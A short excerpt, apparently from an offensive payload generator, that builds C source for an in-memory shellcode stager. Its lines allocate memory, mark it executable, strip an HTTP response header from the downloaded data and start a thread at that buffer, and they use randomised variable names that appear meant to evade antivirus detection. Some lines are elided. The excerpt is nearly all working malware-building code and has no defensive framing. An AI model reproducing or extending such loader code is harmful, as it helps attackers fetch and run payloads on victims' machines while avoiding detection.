...
Hollow_code += Randpointer1 + " = (LPVOID)" + Ndcvirtual + "(0,1000000,MEM_COMMIT,PAGE_READWRITE);\n"
...
Hollow_code += "BOOL " + Randbool + " = (BOOL)" + Ndcvirtualpro + "(" + Randpointer1 + ",1000000,0x40,&" + Oldprot + ");\n"
Hollow_code += Randpointer1 + " = strstr(" + Randpointer1 + ", \"\\r\\n\\r\\n\") + 4;\n"
...
Hollow_code += Randhand + " = (HANDLE) " + Ndccreatethread + "(NULL,0,(LPVOID)" + Randpointer1 + ",NULL,0,&"+ Randthread + ");\n"
